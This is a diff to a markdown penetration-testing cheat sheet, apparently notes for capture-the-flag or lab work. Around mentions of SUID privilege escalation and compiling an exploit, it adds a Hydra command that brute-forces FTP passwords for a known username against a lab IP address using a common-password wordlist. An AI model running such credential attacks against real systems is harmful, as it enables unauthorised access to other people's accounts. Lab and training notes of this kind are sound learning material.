@@ -61,6 +61,12 @@ If for example we find that python has SUID permissions, we can move to the pyth
 
 ```gcc exploit.c -o exploit```
 
+### Brute-forcing
+
+#### Hydra brute force ftp with known username
+
+```hydra -v -l chris -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt ftp://10.10.15.235:21```
+
 ### Windows
 
 #### Powershell History
